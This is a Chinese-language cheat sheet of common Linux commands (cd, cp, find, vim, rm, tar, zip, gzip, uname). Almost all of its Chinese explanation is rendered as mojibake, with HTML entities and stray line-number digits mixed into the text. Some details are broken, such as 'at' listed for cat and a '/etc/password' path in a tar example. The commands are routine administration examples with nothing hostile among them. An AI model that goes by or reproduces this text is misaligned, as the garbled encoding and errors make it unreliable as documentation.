directoryï¼šä»å½“å‰å·¥ä½œç›®å½•åˆ‡æ¢åˆ°æŒ‡å®šçš„å·¥ä½œç›®å½•cd - &#x2F;&#x2F;è¿”å›ä¸Šæ¬¡æ‰€åœ¨çš„ç›®å½•1cp å…¨æ‹¼ä¸ºcopyï¼ŒåŠŸèƒ½ä¸ºå¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•ã€‚eg1ï¼š å¤åˆ¶ç›®å½•åŠå…¶ä¸‹éšè—æ–‡ä»¶åˆ°ç›®æ ‡â€”â€”&gt;2ç§æ–¹æ³•ï¼š1ï¼‰æ–¹æ³•ä¸€ï¼š cp -rf ls -A1 --color=never ç›®æ ‡ç›®å½•1å…¶ä¸­ï¼šâ€“color&#x3D;neveré€‰é¡¹æ˜¯ä¸ºäº†å…³é—­lsçš„å½©è‰²æ˜¾ç¤ºï¼Œä¸€èˆ¬éƒ½æ˜¯æ‰“å¼€çš„ï¼Œå¦‚æœæ‰“å¼€äº†ï¼Œä¼šåŒ…å«å½©è‰²æ˜¾ç¤ºçš„è½¬ä¹‰å­—ç¬¦ï¼Œcpå‘½ä»¤ä¼šæç¤ºæ‰¾ä¸åˆ°æ–‡ä»¶ã€‚-1é€‰é¡¹ï¼Œè®©lsä¸€è¡Œåªæ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•åï¼Œä»…æ˜¯ä¸ºçœ‹ç€èˆ’æœï¼Œè¿™é‡ŒåŠ ä¸åŠ éƒ½ä¸å½±å“ã€‚å¦‚æœå·²ç»å°†ééšè—çš„æ–‡ä»¶æˆ–ç›®å½•å¤åˆ¶è¿‡å»äº†ï¼Œä»…æƒ³å¤åˆ¶éšè—çš„æ–‡ä»¶å’Œç›®å½•ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š cp -urf ls -A1 --color=never ç›®æ ‡ç›®å½•1å…¶ä¸­ï¼š-uå‚æ•°ï¼Œåªä¼šå¤åˆ¶ç›®æ ‡ç›®å½•ä¸‹ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼›æˆ–è€…ç›®æ ‡ç›®å½•ä¸‹å­˜åœ¨ï¼Œä½†å½“å‰ç›®å½•ä¸‹æ›´æ–°çš„æ–‡ä»¶ã€‚2ï¼‰æ–¹æ³•äºŒï¼š cp -rf ls -d .[^.]* --color=never ç›®æ ‡ç›®å½•1å…¶ä¸­ï¼š-d ä¸å±•å¼€ç›®å½•æ˜¾ç¤ºï¼Œ.[^.]*åŒ¹é…å½“å‰ç›®å½•ä¸‹ä»¥.å¼€å¤´çš„æ–‡ä»¶å’Œç›®å½•ã€‚ tree æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•ç”±æ ¹ç›®å½•å¼€å§‹çš„æ ‘å½¢ç»“æ„lstree æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•ç”±æ ¹ç›®å½•å¼€å§‹çš„æ ‘å½¢ç»“æ„tree -d &#x2F;&#x2F;æ ‘çŠ¶æ˜¾ç¤ºç›®å½•12find æŸ¥æ‰¾ï¼Œç”¨äºæŸ¥æ‰¾ç›®å½•åŠç›®å½•ä¸‹æ–‡ä»¶ã€‚è¯­æ³•ï¼šfind [pathâ€¦] [expression_list] ã€å·¥ä½œåŸç†ã€‘ å…¶ä¸­ï¼Œexpressionåˆ†ä¸ºä¸‰ç§ï¼šoptionsã€testã€actionã€‚å¯¹äºå¤šä¸ªè¡¨è¾¾å¼ï¼Œfindæ˜¯ä»å·¦å‘å³å¤„ç†çš„ï¼Œæ‰€ä»¥è¡¨è¾¾å¼çš„å‰åé¡ºåºä¸åŒä¼šé€ æˆä¸åŒçš„æœç´¢æ€§èƒ½å·®è·ã€‚findå‘½ä»¤é»˜è®¤é€’å½’éå†æ‰€æŒ‡å®šçš„ç›®å½•æ ‘ï¼Œé’ˆå¯¹æ¯ä¸ªæ–‡ä»¶ä¾æ¬¡æ‰§è¡Œfindå‘½ä»¤ä¸­çš„è¡¨è¾¾å¼ï¼Œè¡¨è¾¾å¼é¦–å…ˆæ ¹æ®é€»è¾‘è¿ç®—ç¬¦è¿›è¡Œç»“åˆï¼Œç„¶åä¾æ¬¡ä»å·¦è‡³å³å¯¹è¡¨è¾¾å¼æ±‚å€¼ã€‚ findé¦–å…ˆå¯¹æ•´ä¸ªå‘½ä»¤è¡Œè¿›è¡Œè¯­æ³•è§£æï¼Œå¹¶åº”ç”¨ç»™å®šçš„optionsï¼Œç„¶åå®šä½åˆ°æœç´¢è·¯å¾„pathä¸‹å¼€å§‹å¯¹è·¯å¾„ä¸‹çš„æ–‡ä»¶æˆ–å­ç›®å½•è¿›è¡Œè¡¨è¾¾å¼è¯„ä¼°æˆ–æµ‹è¯•ï¼Œè¯„ä¼°æˆ–æµ‹è¯•çš„è¿‡ç¨‹æ˜¯æŒ‰ç…§è¡¨è¾¾å¼çš„é¡ºåºä»å·¦å‘å³è¿›è¡Œçš„(æ­¤å¤„ä¸è€ƒè™‘æ“ä½œç¬¦çš„å½±å“)ï¼Œå¦‚æœæœ€ç»ˆè¡¨è¾¾å¼çš„è¡¨è¾¾å¼è¯„ä¼°ä¸ºtrueï¼Œåˆ™è¾“å‡º(é»˜è®¤)è¯¥æ–‡ä»¶çš„å…¨è·¯å¾„åã€‚ å¯¹äºfindæ¥è¯´ï¼Œä¸€ä¸ªéå¸¸é‡è¦çš„æ¦‚å¿µï¼šfindçš„æœç´¢æœºåˆ¶æ˜¯æ ¹æ®è¡¨è¾¾å¼è¿”å›çš„true&#x2F;falseå†³å®šçš„ï¼Œæ¯æœç´¢ä¸€æ¬¡éƒ½åˆ¤æ–­ä¸€æ¬¡æ˜¯å¦èƒ½ç¡®å®šæœ€ç»ˆè¯„ä¼°ç»“æœä¸ºtrueï¼Œåªæœ‰è¯„ä¼°çš„æœ€ç»ˆç»“æœä¸ºtrueæ‰ç®—æ˜¯æ‰¾åˆ°ï¼Œå¹¶åˆ‡å…¥åˆ°ä¸‹ä¸€ä¸ªæœç´¢ç‚¹ã€‚eg1ï¼šfind &#x2F;tmp -type f -name â€œ*.logâ€ -exec ls â€˜{}â€™ ; -printï¼Œ##è¯¥findä¸­ç»™å®šäº†ä¸¤ä¸ªtestï¼Œä¸¤ä¸ªactionï¼Œå®ƒä»¬ä¹‹é—´ä»å‰å‘åæŒ‰é¡ºåºè¿›è¡Œè¯„ä¼° è¡¨è¾¾å¼ä¼˜å…ˆçº§å¦‚ä¸‹ï¼š å…¶ä¸­ï¼Œ-regexï¼šè¿™ä¸ªå‚æ•°å’Œ -name æœ‰ç±»ä¼¼çš„ä½œç”¨ï¼Œéƒ½æ˜¯é€šè¿‡æ–‡ä»¶çš„åå­—è¿›è¡ŒåŒ¹é…ï¼Œä½†æ˜¯äºŒè€…çš„ä¸åŒçš„ç‚¹æ˜¯ï¼š 1ï¼‰-name åªæ˜¯å¯¹æ–‡ä»¶çš„åç§°åšåŒ¹é…ï¼Œè€Œ-regex æ˜¯å¯¹æ–‡ä»¶çš„è·¯å¾„åšåŒ¹é…;-regexä¸æ˜¯åŒ¹é…æ–‡ä»¶åï¼Œè€Œæ˜¯åŒ¹é…å®Œæ•´çš„æ–‡ä»¶åï¼ˆåŒ…æ‹¬è·¯å¾„ï¼‰ã€‚ä¾‹å¦‚ï¼Œå½“å‰ç›®å½•ä¸‹æœ‰ä¸€ä¸ªæ–‡ä»¶â€abar9â€ï¼Œå¦‚æœä½ ç”¨â€ab.*9â€æ¥åŒ¹é…ï¼Œå°†æŸ¥æ‰¾ä¸åˆ°ä»»ä½•ç»“æœï¼Œæ­£ç¡®çš„æ–¹æ³•æ˜¯ä½¿ç”¨â€.*ab.9â€æˆ–è€…â€.&#x2F;ab.*9â€æ¥åŒ¹é…ã€‚2ï¼‰ åœ¨éœ€è¦ç”¨æ­£åˆ™è¡¨è¾¾å¼çš„æ—¶å€™ï¼Œ-regex ä¼šæ¯” -nameæ–¹ä¾¿å¾ˆå¤šï¼Œ -name æ˜¯ä¸æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼çš„ï¼Œname é€‰é¡¹åªæ”¯æŒé€šé…ç¬¦ * ? []ï¼Œæ­£åˆ™è¡¨è¾¾å¼æœ‰ä¸åŒçš„æ ‡å‡†ï¼Œæ‰€ä»¥åœ¨findå‘½ä»¤ä¸­å¯ä»¥é€šè¿‡ -regextype æ¥æŒ‡å®šé‡‡ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼è§„èŒƒ , ä»è€Œè®© -regex æŒ‰ç…§æŒ‡å®šçš„æ­£åˆ™è¡¨è¾¾å¼è§„èŒƒå·¥ä½œï¼Œé»˜è®¤æ˜¯ emacs è§„èŒƒï¼›å¦å¤–æœ‰posix-awk, posix-basic, posix-egrep and posix-extendedå››ç§ï¼Œå¯åœ¨manä¸­è·å–å¾—åˆ°ã€‚ ç”¨æ³•ï¼šfind dir -regextype â€œtypeâ€ -regex â€œpatternâ€ ç¤ºä¾‹ï¼šfind . -regextype grep -regex â€œ.*&#x2F;[0-9]{4}$â€ | head &#x2F;&#x2F;æŸ¥æ‰¾æ–‡ä»¶åç§°æ˜¯4ä¸ªæ•°å­—æ„æˆçš„æ–‡ä»¶ï¼Œç„¶åå–ç»“æœçš„å‰10è¡Œï¼Œå…¶ä¸­-regex é‡‡ç”¨çš„æ˜¯ å’Œ grep å‘½ä»¤ç›¸åŒçš„æ­£åˆ™è¡¨è¾¾å¼è§„èŒƒï¼›-regex è¡¨è¾¾å¼å¿½ç•¥äº†æ–‡ä»¶çš„è·¯å¾„â€œ.&#x2F;â€,éœ€åœ¨å¯åæŒ‡å®šè·¯å¾„ã€‚ å¦‚æœç”¨nameï¼š find . -name â€œ[0-9][0-9][0-9][0-9]â€ | head -name é€‰é¡¹ï¼šæŒ‰ç…§æ–‡ä»¶åæ¨¡å¼æ¥åŒ¹é…æ–‡ä»¶ï¼Œè‹¥åŒ¹é…åˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚æœ€å¥½ç”¨å¼•å·å°†æ–‡ä»¶åæ¨¡å¼å¼•èµ·æ¥ï¼Œé˜²æ­¢shellè‡ªå·±è§£æè¦åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚ï¼ˆå¯ä»¥ç”¨å•å¼•å·ä¹Ÿå¯ä»¥ç”¨åŒå¼•å·ï¼Œå•å¼•å·å’ŒåŒå¼•å·åœ¨shellç¯å¢ƒä¸­çš„åŒºåˆ«ï¼Œåè€…å†…ä¸å…¨æ˜¯æ™®é€šå­—ç¬¦ï¼Œå‰è€…ç‰¹æ®Šå­—ç¬¦ä¼šè¢«shellè¯†åˆ«ï¼‰-nameå¯¹å¤§å°å†™å­—æ¯æ•æ„Ÿï¼Œå¦‚æœæƒ³åŒ¹é…æ—¶ä¸è€ƒè™‘å¤§å°å†™å¯ä»¥ä½¿ç”¨-inameæµ‹è¯•é¡¹. find . -name â€œ[A-Za-b]*â€ -print &#x2F;&#x2F;å½“å‰ç›®å½•åŠå­ç›®å½•ä¸­æŸ¥æ‰¾æ–‡ä»¶åä»¥ä¸€ä¸ªå¤§å†™å­—æ¯å¼€å¤´æˆ–è€…ä»¥å°å†™aæˆ–bå¼€å¤´çš„æ–‡ä»¶ find . -name â€œ[^A-Z][a-z][0-9][0-9].txtâ€ -print &#x2F;&#x2F;å½“å‰ç›®å½•æŸ¥æ‰¾æ–‡ä»¶åä¸ä»¥å¤§å†™å­—æ¯å¼€å¤´ï¼Œä¹‹åè·Ÿä¸€ä¸ªå°å†™å­—æ¯ï¼Œå†ä¹‹åæ˜¯ä¸¤ä¸ªæ•°å­—ï¼Œæœ€åæ˜¯.txtçš„æ–‡ä»¶;æ³¨æ„,æ­¤å¤„çš„æ¨¡å¼åŒ¹é…å¹¶ä¸ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼ã€‚ find . -size +0c -wholename â€œe[0-9]*â€ -o ! &#x2F;( -name â€œ.â€ -o -name â€œphoneâ€ &#x2F;) -prune -name â€œ.câ€ -user xixi -o -name â€œ*phoneâ€ &#x2F;&#x2F;-pruneæ˜¯ä¸€ä¸ªåŠ¨ä½œé¡¹ï¼Œå®ƒè¡¨ç¤ºå½“æ–‡ä»¶æ˜¯ä¸€ä¸ªç›®å½•æ–‡ä»¶æ—¶ï¼Œä¸è¿›å…¥æ­¤ç›®å½•è¿›è¡Œæœç´¢ã€‚-pruneç»å¸¸å’Œ-pathæˆ–-wholenameä¸€èµ·ä½¿ç”¨ï¼Œä»¥é¿å¼€æŸä¸ªç›®å½•ï¼Œå¸¸è§çš„å½¢å¼æ˜¯ï¼š find PATH (-path &lt;donâ€™t want this path #1&gt; -o -path &lt;donâ€™t want this path #2&gt;) -prune -o -path &#x2F;&#x2F;æ³¨æ„:å¦‚æœåŒæ—¶ä½¿ç”¨-depthè®¾ç½®é¡¹ï¼Œé‚£ä¹ˆ-pruneå°†è¢«findå‘½ä»¤å¿½ç•¥ã€‚ find . -maxdepth 1 -name *.jpg -print -exec convert â€œ{}â€ -resize 80x60 â€œthumbs&#x2F;{}â€ ; #æ‰¹é‡è°ƒæ•´å½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶å¤§å°å¹¶å°†å®ƒä»¬å‘é€åˆ°æŒ‡å®šçš„ç¼©ç•¥å›¾ç›®å½• find &#x2F; -user user1 æœç´¢å±äºç”¨æˆ· â€˜user1â€™ çš„æ–‡ä»¶å’Œç›®å½•find &#x2F;usr&#x2F;bin -type f -atime +100 æœç´¢åœ¨è¿‡å»100å¤©å†…æœªè¢«ä½¿ç”¨è¿‡çš„æ‰§è¡Œæ–‡ä»¶find &#x2F;usr&#x2F;bin -type f -mtime -10 æœç´¢åœ¨10å¤©å†…è¢«åˆ›å»ºæˆ–è€…ä¿®æ”¹è¿‡çš„æ–‡ä»¶find &#x2F; -name \\*.rpm -exec chmod 755 â€˜{}â€™ ; æœç´¢ä»¥ â€˜.rpmâ€™ ç»“å°¾çš„æ–‡ä»¶å¹¶å®šä¹‰å…¶æƒé™find &#x2F; -xdev -name *.rpm æœç´¢ä»¥ â€˜.rpmâ€™ ç»“å°¾çš„æ–‡ä»¶ï¼Œå¿½ç•¥å…‰é©±ã€æ·ç›˜ç­‰å¯ç§»åŠ¨è®¾å¤‡ æ›´å¤šå‚è€ƒï¼šå‚è€ƒ1ï¼›å‚è€ƒ2 locate *.ps å¯»æ‰¾ä»¥ â€˜.psâ€™ ç»“å°¾çš„æ–‡ä»¶ - å…ˆè¿è¡Œ â€˜updatedbâ€™ å‘½ä»¤whereis halt æ˜¾ç¤ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€æºç æˆ–mançš„ä½ç½®which halt æ˜¾ç¤ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ vim&#x2F;vi æ–‡æœ¬ç¼–è¾‘å™¨ï¼š1ï¼‰å¸¸ç”¨å¿«æ·é”®ï¼š(åœ¨ä¸€èˆ¬æ¨¡å¼ä¸‹ä½¿ç”¨)ï¼š a ï¼šåœ¨å…‰æ ‡åä¸€ä½å¼€å§‹æ’å…¥ A åœ¨è¯¥è¡Œçš„æœ€åæ’å…¥ I åœ¨è¯¥è¡Œçš„æœ€å‰é¢æ’å…¥ gg ç›´æ¥è·³åˆ°æ–‡ä»¶çš„é¦–è¡Œ G ç›´æ¥è·³åˆ°æ–‡ä»¶çš„æœ«è¡Œ dd åˆ é™¤ä¸€è¡Œï¼›3dd åˆ é™¤3è¡Œï¼›yy å¤åˆ¶ä¸€è¡Œï¼›3yy å¤åˆ¶3è¡Œï¼›p ç²˜è´´ï¼›uï¼šå³undoæ’¤é”€æ“ä½œï¼› v ï¼šè¿›å…¥å­—ç¬¦é€‰æ‹©æ¨¡å¼ï¼Œé€‰æ‹©å®Œæˆåï¼ŒæŒ‰yå¤åˆ¶ï¼ŒæŒ‰pç²˜è´´ ctrl+v è¿›å…¥å—é€‰æ‹©æ¨¡å¼ï¼Œé€‰æ‹©å®Œæˆåï¼ŒæŒ‰yå¤åˆ¶ï¼ŒæŒ‰pç²˜è´´ shift+v è¿›å…¥è¡Œé€‰æ‹©æ¨¡å¼ï¼Œé€‰æ‹©å®Œæˆåï¼ŒæŒ‰yå¤åˆ¶ï¼ŒæŒ‰pç²˜è´´ 2ï¼‰æŸ¥æ‰¾å¹¶æ›¿æ¢ 1 æ˜¾ç¤ºè¡Œå· :set nu 2 éšè—è¡Œå·ï¼š:set nonu 3 æŸ¥æ‰¾å…³é”®å­— :&#x2F;you ## æ•ˆæœï¼šæŸ¥æ‰¾æ–‡ä»¶ä¸­å‡ºç°çš„youï¼Œå¹¶å®šä½åˆ°ç¬¬ä¸€ä¸ªæ‰¾åˆ°çš„åœ°æ–¹ï¼ŒæŒ‰nå¯ä»¥å®šä½åˆ°ä¸‹ä¸€ä¸ªåŒ¹é…ä½ç½®(æŒ‰Nå®šä½åˆ°ä¸Šä¸€ä¸ª) 4 æ›¿æ¢æ“ä½œ ï¼šs&#x2F;sad&#x2F;bbb æŸ¥æ‰¾å…‰æ ‡æ‰€åœ¨è¡Œçš„ç¬¬ä¸€ä¸ªsadï¼Œæ›¿æ¢ä¸ºbbb :%s&#x2F;sad&#x2F;bbb æŸ¥æ‰¾æ–‡ä»¶ä¸­æ‰€æœ‰sadï¼Œæ›¿æ¢ä¸ºbbb å…¶ä»–ï¼šmkdir å…¨æ‹¼ä¸ºmake directoriesï¼Œå…¶åŠŸèƒ½æ˜¯åˆ›å»ºç›®å½•ã€‚-pï¼šåˆ›å»ºå¤šçº§ç›®å½•ï¼›mv å…¨æ‹¼ä¸ºmoveï¼Œå…¶åŠŸèƒ½æ˜¯ç§»åŠ¨æˆ–é‡å‘½åæ–‡ä»¶ã€‚pwd å…¨æ‹¼ä¸ºprint working directoryï¼ŒåŠŸèƒ½æ˜¯æ˜¾ç¤ºå½“å‰å·¥ä½œç›®å½•çš„ç»å¯¹è·¯å¾„ã€‚rename ç”¨äºé‡æ–°å‘½åæ–‡ä»¶ã€‚rm å…¨æ‹¼ä¸ºremoveï¼Œå…¶åŠŸèƒ½æ˜¯åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶æˆ–ç›®å½•ã€‚rmdir å…¨æ‹¼ä¸ºremove empty directoriesï¼ŒåŠŸèƒ½æ˜¯åˆ é™¤ç©ºç›®å½•ã€‚touch åˆ›å»ºä¸ªç©ºæ–‡ä»¶ï¼Œæ”¹å˜å·²æœ‰æ–‡ä»¶çš„æ—¶é—´æˆ³å±æ€§ã€‚tree åŠŸèƒ½æ˜¯ä»¥æ ‘å½¢ç»“æ„æ˜¾ç¤ºç›®å½•ä¸‹çš„å†…å®¹ã€‚basename æ˜¾ç¤ºæ–‡ä»¶åæˆ–ç€ç›®å½•åã€‚dirname æ˜¾ç¤ºæ–‡ä»¶æˆ–ç€ç›®å½•è·¯å¾„ã€‚chattr æ”¹å˜æ–‡ä»¶æ‰©å±•å±æ€§ã€‚lsattr æŸ¥çœ‹æ–‡ä»¶æ‰©å±•å±æ€§ã€‚file æ˜¾ç¤ºæ–‡ä»¶ç±»å‹ã€‚md5sum è®¡ç®—å’Œæ ¡éªŒæ–‡ä»¶çš„MD5å€¼ã€‚rmdir dir1 åˆ é™¤ä¸€ä¸ªå«åš â€˜dir1â€™ çš„ç›®å½•â€™rm -rf dir1 åˆ é™¤ä¸€ä¸ªå«åš â€˜dir1â€™ çš„ç›®å½•å¹¶åŒæ—¶åˆ é™¤å…¶å†…å®¹rm -rf dir1 dir2 åŒæ—¶åˆ é™¤ä¸¤ä¸ªç›®å½•åŠå®ƒä»¬çš„å†…å®¹ln -s file1 lnk1 åˆ›å»ºä¸€ä¸ªæŒ‡å‘æ–‡ä»¶æˆ–ç›®å½•çš„è½¯é“¾æ¥ln file1 lnk1 åˆ›å»ºä¸€ä¸ªæŒ‡å‘æ–‡ä»¶æˆ–ç›®å½•çš„ç‰©ç†é“¾æ¥touch -t 0712250000 file1 ä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„æ—¶é—´æˆ³ (æ ¼å¼ï¼šYYMMDDhhmm)file file1 æ–‡ä»¶ç±»å‹æŸ¥çœ‹iconv -l åˆ—å‡ºå·²çŸ¥çš„ç¼–ç  2ã€æŸ¥çœ‹æ–‡ä»¶ã€å†…å®¹å¤„ç†å‘½ä»¤ï¼ˆ21ä¸ªï¼‰at å…¨æ‹¼ä¸ºconcatenateï¼ŒåŠŸèƒ½æ˜¯ç”¨äºè¿æ¥å¤šä¸ªæ–‡ä»¶å¹¶ä¸”æ‰“å°åˆ°å±å¹•è¾“å‡ºæˆ–é‡å®šå‘åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ã€‚tac tacæ˜¯catçš„åå‘æ‹¼å†™ï¼Œå› æ­¤å‘½ä»¤çš„åŠŸèƒ½ä¸ºåå‘æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ã€‚more åˆ†é¡µæ˜¾ç¤ºæ–‡ä»¶å†…å®¹ã€‚less åˆ†é¡µæ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼Œmoreå‘½ä»¤çš„ç›¸åç”¨æ³•ã€‚ head æ˜¾ç¤ºæ–‡ä»¶å†…å®¹å¤´éƒ¨ã€‚head -10 install.log æŸ¥çœ‹æ–‡ä»¶å¤´éƒ¨çš„10è¡Œ tail æ˜¾ç¤ºæ–‡ä»¶å†…å®¹å°¾éƒ¨ã€‚tail -10 install.log æŸ¥çœ‹æ–‡ä»¶å°¾éƒ¨çš„10è¡Œ tail +10 install.log æŸ¥çœ‹æ–‡ä»¶ 10â€“&gt;æœ«è¡Œ tail -f install.log å°fè·Ÿè¸ªæ–‡ä»¶çš„å”¯ä¸€inodeå·ï¼Œå°±ç®—æ–‡ä»¶æ”¹ååï¼Œè¿˜æ˜¯è·Ÿè¸ªåŸæ¥è¿™ä¸ªinodeè¡¨ç¤ºçš„æ–‡ä»¶ tail -F install.log å¤§FæŒ‰ç…§æ–‡ä»¶åæ¥è·Ÿè¸ª cutï¼š å°†æ–‡ä»¶çš„æ¯ä¸€è¡ŒæŒ‰æŒ‡å®šåˆ†éš”ç¬¦åˆ†å‰²å¹¶è¾“å‡ºã€‚split åˆ†å‰²æ–‡ä»¶ä¸ºä¸åŒçš„ç‰‡æ®µã€‚paste æŒ‰è¡Œåˆå¹¶æ–‡ä»¶å†…å®¹ã€‚sort å¯¹æ–‡ä»¶çš„æ–‡æœ¬å†…å®¹æ’åºã€‚uniq å»é™¤æ‰é‡å¤è¡Œã€‚wc ç»Ÿè®¡æ–‡ä»¶è¡Œæ•°ã€å•è¯æ•°æˆ–æ˜¯å­—èŠ‚æ•°ã€‚iconv è½¬æ¢æ–‡ä»¶ç¼–ç æ ¼å¼ã€‚dos2unix å°†DOSæ ¼å¼æ–‡ä»¶è½¬æ¢æˆUNIXæ ¼å¼ã€‚diff å…¨æ‹¼ä¸ºdifferenceï¼Œæ¯”è¾ƒæ–‡ä»¶å·®å¼‚ï¼Œç”¨äºæ–‡æœ¬æ–‡ä»¶ã€‚vimdiff å‘½ä»¤è¡Œå¯è§†åŒ–æ–‡ä»¶æ¯”è¾ƒå·¥å…·ï¼Œç”¨äºæ–‡æœ¬æ–‡ä»¶ã€‚rev åå‘è¾“å‡ºæ–‡ä»¶å†…å®¹ã€‚grep&#x2F;egrep å¸¸ç”¨äºè¿‡æ»¤å­—ç¬¦ä¸²ã€‚join æŒ‰ä¸¤ä¸ªæ–‡ä»¶çš„ç›¸åŒå­—æ®µåˆå¹¶ã€‚tr æ›¿æ¢ã€åˆ é™¤å­—ç¬¦ã€‚vi&#x2F;vim å‘½ä»¤è¡Œæ–‡æœ¬ç¼–è¾‘å™¨ã€‚ 3ã€æœç´¢æ–‡ä»¶å‘½ä»¤ï¼ˆ4ä¸ªï¼‰which æŸ¥æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶çš„å‘½ä»¤ï¼ŒæŒ‰ç¯å¢ƒå˜é‡PATHè·¯å¾„æŸ¥æ‰¾ã€‚which ls &#x2F;&#x2F;æŸ¥æ‰¾å¯æ‰§è¡Œçš„å‘½ä»¤æ‰€åœ¨çš„è·¯å¾„ find ä»ç£ç›˜éå†æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•ã€‚find &#x2F; -name â€œhadooop*â€ -ok rm {} ; find &#x2F; -name â€œhadooop*â€ -exec rm {} ;find &#x2F;home -user hadoop -type d -ls ##æŸ¥æ‰¾ç”¨æˆ·ä¸ºhadoopçš„æ–‡ä»¶å¤¹1234whereis æŸ¥æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶çš„å‘½ä»¤ï¼ŒæŒ‰ç¯å¢ƒå˜é‡PATHè·¯å¾„æŸ¥æ‰¾ã€‚ç›¸å¯¹äºwhichï¼Œwhereis æŸ¥æ‰¾å¯æ‰§è¡Œçš„å‘½ä»¤å’Œå¸®åŠ©çš„ä½ç½®ï¼› locate ä»æ•°æ®åº“&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.dbä¸­æŸ¥æ‰¾å‘½ä»¤ï¼Œä½¿ç”¨updatedbæ›´æ–°åº“ã€‚4ã€æ–‡ä»¶å‹ç¼©åŠè§£å‹ç¼©å‘½ä»¤ï¼ˆ4ä¸ªï¼‰tar æ‰“åŒ…å‹ç¼©ã€‚tar -cvzf bak.tar .&#x2F;aaa å°†&#x2F;etc&#x2F;passwordè¿½åŠ æ–‡ä»¶åˆ°bak.tarä¸­(r) tar -rvf bak.tar &#x2F;etc&#x2F;passwordtar -xvf bak.tarè§£å‹åˆ°&#x2F;usr&#x2F;ä¸‹ï¼štar -zxvf a.tar.gz -C &#x2F;usræŸ¥çœ‹å‹ç¼©åŒ…å†…å®¹tar -ztvf a.tar.gz tar -cvf archive.tar file1 åˆ›å»ºä¸€ä¸ªéå‹ç¼©çš„ tarballtar -cvf archive.tar file1 file2 dir1 åˆ›å»ºä¸€ä¸ªåŒ…å«äº† â€˜file1â€™, â€˜file2â€™ ä»¥åŠ â€˜dir1â€™çš„æ¡£æ¡ˆæ–‡ä»¶tar -tf archive.tar æ˜¾ç¤ºä¸€ä¸ªåŒ…ä¸­çš„å†…å®¹tar -xvf archive.tar é‡Šæ”¾ä¸€ä¸ªåŒ…tar -xvf archive.tar -C &#x2F;tmp å°†å‹ç¼©åŒ…é‡Šæ”¾åˆ° &#x2F;tmpç›®å½•ä¸‹tar -cvfj archive.tar.bz2 dir1 åˆ›å»ºä¸€ä¸ªbzip2æ ¼å¼çš„å‹ç¼©åŒ…tar -xvfj archive.tar.bz2 è§£å‹ä¸€ä¸ªbzip2æ ¼å¼çš„å‹ç¼©åŒ…tar -cvfz archive.tar.gz dir1 åˆ›å»ºä¸€ä¸ªgzipæ ¼å¼çš„å‹ç¼©åŒ…tar -xvfz archive.tar.gz è§£å‹ä¸€ä¸ªgzipæ ¼å¼çš„å‹ç¼©åŒ…123456789unzip è§£å‹å’Œzipå‹ç¼©æ–‡ä»¶ã€‚zip file1.zip file1 åˆ›å»ºä¸€ä¸ªzipæ ¼å¼çš„å‹ç¼©åŒ…zip -r file1.zip file1 file2 dir1 å°†å‡ ä¸ªæ–‡ä»¶å’Œç›®å½•åŒæ—¶å‹ç¼©æˆä¸€ä¸ªzipæ ¼å¼çš„å‹ç¼©åŒ…unzip file1.zip è§£å‹ä¸€ä¸ªzipæ ¼å¼å‹ç¼©åŒ…123gzip å‹ç¼©å·¥å…·ã€‚gunzip a.txt.gzæˆ–gzip -d a.txt.gzgunzip file1.gz è§£å‹ä¸€ä¸ªå«åš â€˜file1.gzâ€™çš„æ–‡ä»¶gzip file1 å‹ç¼©ä¸€ä¸ªå«åš â€˜file1â€™çš„æ–‡ä»¶gzip -9 file1 æœ€å¤§ç¨‹åº¦å‹ç¼©1234bzip2å’Œbunzip2è§£å‹ç¼©bunzip2 a.bz2 bzip2 -d a.bz2123æ‰“åŒ…å¹¶å‹ç¼©æˆbz2 ï¼š tar -jcvf a.tar.bz2â€”â€”&gt;è§£å‹ï¼štar -jxvf a.tar.bz2bunzip2 file1.bz2 è§£å‹ä¸€ä¸ªå«åš â€˜file1.bz2â€™çš„æ–‡ä»¶bzip2 file1 å‹ç¼©ä¸€ä¸ªå«åš â€˜file1â€™ çš„æ–‡ä»¶ rarå‹ç¼©å’Œunrarè§£å‹ç¼©rar a file1.rar test_file åˆ›å»ºä¸€ä¸ªå«åš â€˜file1.rarâ€™ çš„åŒ…rar a file1.rar file1 file2 dir1 åŒæ—¶å‹ç¼© â€˜file1â€™, â€˜file2â€™ ä»¥åŠç›®å½• â€˜dir1â€™rar x file1.rar è§£å‹raråŒ…unrar x file1.rar è§£å‹raråŒ…12345ã€ç³»ç»Ÿä¿¡æ¯æŸ¥è¯¢å‘½ä»¤ï¼ˆ11ä¸ªï¼‰uname æ˜¾ç¤ºæ“ä½œç³»ç»Ÿç›¸å…³ä¿¡æ¯ã€‚hostname æ˜¾ç¤ºæˆ–è€…è®¾ç½®å½“å‰ç³»ç»Ÿçš„ä¸»æœºåã€‚dmesg æ˜¾ç¤ºå¼€æœºä¿¡æ¯ï¼Œç”¨äºè¯Šæ–­ç³»ç»Ÿæ•…éšœã€‚uptime æ˜¾ç¤ºç³»ç»Ÿè¿è¡Œæ—¶é—´ä»¥åŠè´Ÿè½½ã€‚stat æ˜¾ç¤ºæ–‡ä»¶æˆ–æ–‡ä»¶ç³»ç»Ÿçš„çŠ¶æ€ã€‚arch æ˜¾ç¤ºæœºå™¨çš„å¤„ç†å™¨æ¶æ„(1)uname 